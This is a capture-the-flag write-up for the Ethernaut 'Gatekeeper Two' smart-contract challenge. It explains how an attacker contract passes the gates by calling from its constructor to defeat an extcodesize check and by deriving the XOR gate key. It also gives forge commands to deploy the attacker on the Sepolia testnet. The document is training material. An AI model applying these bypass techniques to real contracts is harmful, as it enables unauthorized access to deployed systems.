# Ethernaut Challenge 14 — Gatekeeper Two

This challenge introduces low-level EVM concepts such as `extcodesize` and bitwise operations.

The goal is to pass all gates and register as the `entrant`.

Instance address:

```
0x2AE2F44a2896f194bCe2c5a0A1883e53C1F9FB6e
```

---

## 🎯 Goal

Successfully call `enter(bytes8 _gateKey)` and set yourself as the `entrant`.

---

## 🧠 Understanding the challenge

The contract has three modifiers.

---

### Gate 1

```solidity
require(msg.sender != tx.origin);
```

This means the caller must be a **smart contract**, not an EOA.

👉 Solution: call `enter()` from an attacker contract.

---

### Gate 2

```solidity
assembly {
    x := extcodesize(caller())
}
require(x == 0);
```

- `extcodesize(address)` returns the size of the code at an address

| Caller type | extcodesize |
|------------|------------|
| EOA | 0 |
| Contract (deployed) | > 0 |
| Contract (in constructor) | 0 |

👉 A contract has no code during its constructor.

👉 Solution: call `enter()` **from inside the constructor**.

---

### Gate 3

```solidity
require(
    uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) 
        ^ uint64(_gateKey) 
    == type(uint64).max
);
```

---

## 🔑 Understanding Gate 3

Let:

```
A = uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))
B = uint64(_gateKey)
C = type(uint64).max
```

The condition is:

```
A ^ B = C
```

### XOR property

```
A ^ B = C  →  B = A ^ C
```

So:

```
uint64(_gateKey) = A ^ C
```

---

### Final key

```solidity
bytes8 key =
    bytes8(
        type(uint64).max 
        ^ uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))
    );
```

---

## 🧪 Attacker contract

👉 Implementation: [GatekeeperTwoAttacker.sol](GatekeeperTwoAttacker.sol)  
👉 Test: [GatekeeperTwoTest.t.sol](../../test/GatekeeperTwoTest.t.sol)

The attack:

- call from a contract (Gate 1)
- call during constructor (Gate 2)
- compute the correct key (Gate 3)

---

## 🚀 Run tests

```bash
forge test --mc GatekeeperTwoTest
```

---

## 🚀 Execute on Sepolia

Deploy attacker:

```bash
GATEKEEPER_TWO_SEPOLIA=0x2AE2F44a2896f194bCe2c5a0A1883e53C1F9FB6e

forge create src/challenge-14-gatekeeper-two/GatekeeperTwoAttacker.sol:GatekeeperTwoAttacker \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast \
  --constructor-args $GATEKEEPER_TWO_SEPOLIA
```

Deployed contract:

```
0xBD7b1E7343E45feCA374547BB899ccf98c371E2B
```

---

## ✅ Verify

```bash
cast call $GATEKEEPER_TWO_SEPOLIA \
    "entrant()" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
0x000000000000000000000000ecf94300dd67bb8c31f41be3a2136d3f0abfb0b0
```

Challenge solved ✅

